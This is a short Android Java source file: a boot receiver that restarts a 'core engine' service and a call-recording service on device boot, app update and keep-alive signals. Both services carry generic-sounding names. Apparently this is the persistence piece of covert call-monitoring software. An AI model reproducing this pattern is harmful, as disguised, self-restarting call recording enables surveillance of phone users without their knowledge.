package com.labs.labrats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class SystemBoot extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Constants.ACTION_KEEP_ALIVE.equals(action) || 
            Constants.ACTION_KEEP_ALIVE.equals(action) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Constants.ACTION_AUTO_START.equals(action)) {
            // Start Core Engine
            Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
            serviceIntent.setAction(Constants.ACTION_START_CORE);

            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);

            // Start Call Record Service for call detection
            Intent callServiceIntent = new Intent(context, MediaFrameworkService.class);
            callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
            androidx.core.content.ContextCompat.startForegroundService(context, callServiceIntent);
        }
    }
}
